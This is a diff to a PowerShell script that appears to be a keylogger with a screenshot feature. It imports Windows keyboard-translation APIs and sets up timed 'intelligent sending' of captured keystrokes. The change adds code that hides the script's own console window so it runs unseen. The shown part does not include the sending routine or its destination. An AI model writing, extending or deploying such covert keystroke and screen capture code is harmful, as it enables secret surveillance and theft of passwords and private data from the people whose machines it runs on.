@@ -5,7 +5,18 @@ if ($dc.Ln -ne 121) {
 
 $send = ""  # Inicialización de la variable $send
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
-$Type = Add-Type -MemberDefinition $Async -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
+$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+$hwnd = (Get-Process -PID $pid).MainWindowHandle
+
+if ($hwnd -ne [System.IntPtr]::Zero) {
+    $Type::ShowWindowAsync($hwnd, 0)
+}
+else {
+    $Host.UI.RawUI.WindowTitle = 'hideme'
+    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+    $hwnd = $Proc.MainWindowHandle
+    $Type::ShowWindowAsync($hwnd, 0)
+}
 
 # Import DLL Definitions for keyboard inputs
 $API = @'
@@ -18,16 +29,17 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
+
 $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
 
 # Add stopwatch for intelligent sending
 $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
 $KeypressThreshold = [TimeSpan]::FromSeconds(10)
 
-$seconds = 30 # Screenshot interval
-$a = 1 # Screenshot amount
+$seconds = 30  # Screenshot interval
+$a = 1  # Screenshot amount
 
-# Mantener el script en segundo plano
+# Start a continuous loop
 while ($true) {
     $keyPressed = $false
 
